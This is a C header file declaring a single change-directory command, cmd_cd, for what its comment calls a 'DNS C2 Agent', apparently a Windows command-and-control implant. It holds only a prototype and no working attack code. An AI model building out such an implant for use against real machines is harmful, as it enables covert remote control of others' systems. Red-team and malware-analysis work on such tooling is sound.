/**
 * cd.h - Change directory command for DNS C2 Agent
 */

 #ifndef CD_H
 #define CD_H
 
 #include <windows.h>
 
 /**
  * Change the current directory
  * 
  * @param args The directory to change to
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_cd(const char* args);
 
 #endif // CD_H
 
